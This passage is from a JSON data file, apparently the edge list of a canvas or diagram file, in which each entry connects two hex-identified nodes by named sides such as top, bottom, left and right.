		{"id":"0f4fae7ce91317c7","fromNode":"a2f836539870d50a","fromSide":"top","toNode":"035ea3e0678a1a0c","toSide":"bottom"},
		{"id":"60b3b7ddda4ee604","fromNode":"4bc8e7164fdbe72c","fromSide":"top","toNode":"7e82fc28e072452c","toSide":"bottom"},
		{"id":"d23f4665abf9890b","fromNode":"4bc8e7164fdbe72c","fromSide":"right","toNode":"a31071b1ab37d14f","toSide":"top"},
		{"id":"047c63430734ec27","fromNode":"a31071b1ab37d14f","fromSide":"top","toNode":"639a6638a5e1ac87","toSide":"bottom"},
		{"id":"3d8ff859ecf198f5","fromNode":"01cdae7f32b164ac","fromSide":"top","toNode":"4e1e076b7447aa3d","toSide":"bottom"},
		{"id":"694ad084d8f38e9c","fromNode":"259ccd5df8aa103f","fromSide":"top","toNode":"2d633828445970b9","toSide":"bottom"},
		{"id":"4cb43e5701b4d551","fromNode":"f8e56833c27ae0c6","fromSide":"top","toNode":"5e928c0c1bff9787","toSide":"bottom"},
		{"id":"548e671981c9bf66","fromNode":"826a2b71cbfeccd5","fromSide":"top","toNode":"8671f2d17262ec8a","toSide":"bottom"},
		{"id":"634a5cd9698a11c4","fromNode":"8abf6f8845da0c81","fromSide":"bottom","toNode":"f5e4da73c3c86c83","toSide":"top"},
		{"id":"1d7041dffc783225","fromNode":"db12e951c6d4fed7","fromSide":"top","toNode":"e6a983b812eed4b8","toSide":"bottom"},
		{"id":"dbe3420345ff90f0","fromNode":"4bc8e7164fdbe72c","fromSide":"left","toNode":"a2f836539870d50a","toSide":"top"},
		{"id":"c26320f3a1e82f8f","fromNode":"4bc8e7164fdbe72c","fromSide":"right","toNode":"259ccd5df8aa103f","toSide":"left"},
		{"id":"ee8e2a127c9c1bbd","fromNode":"a2f836539870d50a","fromSide":"bottom","toNode":"ede5772628b98ff2","toSide":"top"},
		{"id":"f9d5fe92a9496cd1","fromNode":"b7b7969d4f2f88a5","fromSide":"bottom","toNode":"99d0a35a3c7e79f4","toSide":"top"},
		{"id":"982cb201b00a0576","fromNode":"99d0a35a3c7e79f4","fromSide":"bottom","toNode":"9e8d77dbb05db6ea","toSide":"top"},
		{"id":"b46f31e26c9f61a6","fromNode":"9e8d77dbb05db6ea","fromSide":"right","toNode":"f44be1244f4cf643","toSide":"left"},
		{"id":"0d1ed074eb1ae405","fromNode":"f44be1244f4cf643","fromSide":"right","toNode":"e5b4b2ccb754772a","toSide":"left"},
		{"id":"d8cdfed637826b00","fromNode":"bcae3d35289d0155","fromSide":"bottom","toNode":"b7b7969d4f2f88a5","toSide":"top"},
		{"id":"68078058e6deed10","fromNode":"1ffcff4fe3313c37","fromSide":"right","toNode":"6ddb2d5b5f75802f","toSide":"left"},
		{"id":"0aa7273348886bba","fromNode":"6ddb2d5b5f75802f","fromSide":"bottom","toNode":"1dc8c9234c9fcc58","toSide":"top"},
		{"id":"ad4fc1cd8ebc9b98","fromNode":"0fb871e24d58af81","fromSide":"bottom","toNode":"1b6464cd07ffaf76","toSide":"top"},
		{"id":"bf4096613e6db76e","fromNode":"1b6464cd07ffaf76","fromSide":"bottom","toNode":"df8b5af8fb2ba2b8","toSide":"top"},
		{"id":"b3f9da7b17cbc883","fromNode":"df8b5af8fb2ba2b8","fromSide":"right","toNode":"37b8a9a92a04308e","toSide":"left"},
		{"id":"90cd7f810d44e3de","fromNode":"37b8a9a92a04308e","fromSide":"right","toNode":"aa3229e734b67def","toSide":"left"},
		{"id":"2fafa757906f9d0f","fromNode":"76058a63c5168079","fromSide":"bottom","toNode":"74827dc6939e71a1","toSide":"top"},
		{"id":"8e137e26e0f65ad3","fromNode":"08631b2c940ef182","fromSide":"bottom","toNode":"673f9dbd940cce7c","toSide":"top"},
		{"id":"83a464458ad01901","fromNode":"6ddb2d5b5f75802f","fromSide":"right","toNode":"b53d81a2b0290dfa","toSide":"left"},
		{"id":"13c374b8999bd774","fromNode":"b53d81a2b0290dfa","fromSide":"right","toNode":"6267ceec90bc2942","toSide":"left"},
		{"id":"1a271a3ee0d69621","fromNode":"3b809ce8cdcf3566","fromSide":"right","toNode":"dd66b7336ed9bb7e","toSide":"left"},
		{"id":"13e76e7e70d8fb58","fromNode":"dd66b7336ed9bb7e","fromSide":"right","toNode":"6e5eb02ae24bdcc5","toSide":"left"},
		{"id":"747e422d5ef9e9be","fromNode":"020f60b247b3f693","fromSide":"right","toNode":"61ff9da848dcdad2","toSide":"left"},
		{"id":"f82f71dbb0407257","fromNode":"af95e1f07adb71eb","fromSide":"right","toNode":"dbc8fe5997ab7028","toSide":"left"},
		{"id":"79d422439f5e43b3","fromNode":"28c9e456978ddec6","fromSide":"right","toNode":"d321cd1cd99f957e","toSide":"left"},
		{"id":"dec7c7bfc38f20fe","fromNode":"d321cd1cd99f957e","fromSide":"right","toNode":"11075692afb8722e","toSide":"left"}
	]
}